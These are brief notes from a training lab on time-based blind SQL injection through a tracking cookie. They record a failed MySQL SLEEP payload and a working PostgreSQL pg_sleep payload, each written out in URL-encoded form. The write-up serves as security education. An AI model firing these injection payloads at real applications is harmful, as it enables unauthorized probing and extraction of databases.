# Lab: Blind SQL injection with time delays

Vulnerable parameter - tracking cookie

End Goal :

- prove that the field os vulnerable to blind SQLi (time based)

Analysis :

`'+||++(SELECT+SLEEP(10))+--+%23+` -> didn't work-> NOT mysql
`'+||+(SELECT+pg_sleep(10))+--+` -> worked -> postgresssql
